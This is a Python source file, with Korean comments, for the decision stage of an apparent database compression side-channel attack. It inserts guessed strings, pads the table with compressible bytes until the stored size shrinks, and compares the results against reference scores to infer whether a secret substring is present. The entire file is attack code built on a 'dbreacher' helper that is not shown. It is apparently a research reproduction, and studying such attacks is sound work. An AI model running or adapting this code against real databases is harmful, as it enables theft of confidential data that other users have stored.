# decision_attacker.py
import os
import time
from typing import Iterable, List, Tuple, Dict, Optional
import dbreacher

class decisionAttacker:
    """
    각 guess g에 대해:
      - b(g): 현재 세팅에서 shrink까지 필요한 '압축 바이트 수'
      - b_no(L): 길이 L의 랜덤 참조(미존재) 점수
      - b_yes(L): 길이 L의 존재 참조(이미 페이지에 있는 서브스트링) 점수
    를 구하고, 필요 시 min-정규화하여 반환.
    """

    def __init__(
        self,
        dbreacher: dbreacher.DBREACHer,
        guesses: List[str],
        fillerCharSet: Optional[Iterable[str]] = None,
    ):
        self.dbreacher = dbreacher
        # 중복 제거로 불필요한 측정 방지(원 순서 유지)
        seen = set()
        self.guesses = [g for g in guesses if not (g in seen or seen.add(g))]

        # 길이별 참조 캐시
        self._b_yes: Dict[int, float] = {}
        self._b_no: Dict[int, float] = {}
        # 개별 guess 점수
        self._b_guess: Dict[str, float] = {}

        # 랜덤 참조 생성 시 사용할 charset
        if fillerCharSet is None:
            fillerCharSet = self.dbreacher.fillerCharSet
        self._fillerSeq = list(fillerCharSet)

        # 기본 verbose는 환경변수 ATTACK_VERBOSE(1/0)에 따름
        self._env_verbose = os.environ.get("ATTACK_VERBOSE", "0") not in ("0", "", "false", "False")

    def setUp(self) -> bool:
        """페이지 경계 세팅. 실패시 False(호출측에서 루프 돌려 재시도)."""
        # 이전 결과 초기화
        self._b_guess.clear()
        self._b_yes.clear()
        self._b_no.clear()
        return self.dbreacher.reinsertFillers()

    def _ensure_refs(self, L: int, verbose: bool = False) -> bool:
        """길이 L에 대한 참조(b_yes, b_no)를 캐시. 실패시 False."""
        if L not in self._b_yes:
            try:
                self._b_yes[L] = self.dbreacher.getSYesReferenceScore(L)
                if verbose:
                    print(f"[REF] b_yes cached for L={L}: {self._b_yes[L]}")
            except RuntimeError:
                if verbose:
                    print(f"[REF] b_yes failed for L={L} (boundary broke).")
                return False
        if L not in self._b_no:
            try:
                self._b_no[L] = self.dbreacher.getSNoReferenceScore(L, self._fillerSeq)
                if verbose:
                    print(f"[REF] b_no cached for L={L}: {self._b_no[L]}")
            except RuntimeError:
                if verbose:
                    print(f"[REF] b_no failed for L={L} (boundary broke).")
                return False
        return True

    def tryAllGuesses(self, verbose: Optional[bool] = None) -> bool:
        """
        각 guess를 시험.
        - guess 자체로 shrink가 나면 세팅이 깨진 것이므로 False(재세팅 필요).
        - 증폭 한도 초과(RuntimeError) 시 False(재세팅).
        - 정상측정 완료시 True.
        """
        if verbose is None:
            verbose = self._env_verbose

        if not self.guesses:
            if verbose:
                print("[WARN] no guesses to test.")
            return True

        for g in self.guesses:
            L = len(g)
            if not self._ensure_refs(L, verbose=verbose):
                return False

            t0 = time.time()
            shrunk = self.dbreacher.insertGuessAndCheckIfShrunk(g)
            if verbose:
                print(f"[GUESS] insert '{g}' (L={L}) -> shrunk={shrunk}")

            if shrunk:
                if verbose:
                    print(f"[WARN] table shrunk too early on guess: '{g}'")
                return False

            try:
                steps = 0
                while not shrunk:
                    shrunk = self.dbreacher.addCompressibleByteAndCheckIfShrunk()
                    steps += 1
            except RuntimeError as e:
                if verbose:
                    print(f"[WARN] amplification failed ({e}). Need to re-setup.")
                return False

            b = self.dbreacher.getBytesShrunkForCurrentGuess()
            if b is None:
                if verbose:
                    print("[ERR] bytesShrunkForCurrentGuess is None; abandoning.")
                return False

            self._b_guess[g] = float(b)
            if verbose:
                dt = time.time() - t0
                print(f"[DONE] '{g}' -> bytesShrunk={b} (steps={steps}, {dt:.4f}s)")

        return True

    def getGuessAndReferenceScores(
        self, normalize_min: bool = True
    ) -> List[Tuple[str, Tuple[float, float, float]]]:
        """
        각 guess에 대해 (b_no, b_guess, b_yes) 튜플을 반환.
        normalize_min=True면 min(b_no, b, b_yes)를 0으로 맞춰 정규화(차이는 보존됨).
        """
        out: List[Tuple[str, Tuple[float, float, float]]] = []
        for g, b in self._b_guess.items():
            L = len(g)
            if L not in self._b_no or L not in self._b_yes:
                continue
            b_no = float(self._b_no[L])
            b_yes = float(self._b_yes[L])
            if normalize_min:
                m = min(b_no, b, b_yes)
                out.append((g, (b_no - m, b - m, b_yes - m)))
            else:
                out.append((g, (b_no, b, b_yes)))
        return out

    def getGuessScores(self) -> Dict[str, float]:
        """원시 guess 점수만 반환."""
        return dict(self._b_guess)
